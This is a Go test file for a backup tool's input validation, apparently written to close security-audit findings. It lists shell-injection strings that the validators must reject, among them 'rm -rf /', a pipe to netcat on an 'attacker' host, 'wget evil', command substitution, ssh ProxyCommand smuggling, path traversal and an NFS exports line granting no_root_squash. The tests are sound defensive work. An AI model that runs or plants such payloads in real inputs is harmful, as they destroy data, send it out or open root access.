package main

import "testing"

// TestValidateBackupPath_RejectsInjection is the C1 closure test: every malicious
// dest/source that could have escaped the old shell pipeline must be rejected.
func TestValidateBackupPath_RejectsInjection(t *testing.T) {
	malicious := []string{
		`/x'; rm -rf / ; '`,          // original PoC from the audit
		`/data; reboot`,              // command separator
		`/data | nc attacker 1 2345`, // pipe
		"/data && wget evil",         // logical and
		"/data`whoami`",              // backtick substitution
		"/data$(whoami)",             // dollar substitution
		`/data > /etc/passwd`,        // redirection
		"/data\nrm -rf /",            // newline injection
		`/data" "extra`,              // quote breakout
		"-oProxyCommand=evil",        // ssh option smuggling via leading dash
		"../../etc/passwd",           // relative + traversal
		"/data/../../../etc",         // traversal inside absolute
		"relative/path",              // not absolute
		"",                           // empty
	}
	for _, p := range malicious {
		if err := validateBackupPath("dest", p); err == nil {
			t.Errorf("expected rejection for %q, got nil", p)
		}
	}
}

// TestValidateBackupPath_AcceptsLegit ensures normal BTRFS subvolume paths pass.
func TestValidateBackupPath_AcceptsLegit(t *testing.T) {
	legit := []string{
		"/mnt/pool1/backups",
		"/mnt/tank/data",
		"/srv/nimos/backups/job1",
		"/data",
		"/mnt/pool-01/sub_vol.2",
	}
	for _, p := range legit {
		if err := validateBackupPath("dest", p); err != nil {
			t.Errorf("expected %q to be accepted, got: %v", p, err)
		}
	}
}

// TestSplitSSHOpts verifies the option string tokenizes to clean argv elements.
func TestSplitSSHOpts(t *testing.T) {
	got := splitSSHOpts("-o StrictHostKeyChecking=yes -o UserKnownHostsFile=/tmp/kh -o ConnectTimeout=30")
	want := []string{"-o", "StrictHostKeyChecking=yes", "-o", "UserKnownHostsFile=/tmp/kh", "-o", "ConnectTimeout=30"}
	if len(got) != len(want) {
		t.Fatalf("len mismatch: got %d want %d (%v)", len(got), len(want), got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("argv[%d]: got %q want %q", i, got[i], want[i])
		}
	}
	if len(splitSSHOpts("")) != 0 {
		t.Errorf("empty opts should produce empty argv")
	}
}

// TestIsValidNFSClient is the A1 closure test: only bare IPs and CIDR ranges
// are accepted as /etc/exports client specs; injection strings are rejected.
func TestIsValidNFSClient(t *testing.T) {
	valid := []string{"192.168.1.50", "10.0.0.0/24", "::1", "fd00::/8"}
	for _, s := range valid {
		if !isValidNFSClient(s) {
			t.Errorf("expected %q to be valid", s)
		}
	}
	invalid := []string{
		`* (rw,no_root_squash) #`, // the audit's injection PoC
		"*",
		"192.168.1.50 (rw)",
		"hostname.local",
		"",
		"192.168.1.0/99",
	}
	for _, s := range invalid {
		if isValidNFSClient(s) {
			t.Errorf("expected %q to be rejected", s)
		}
	}
}
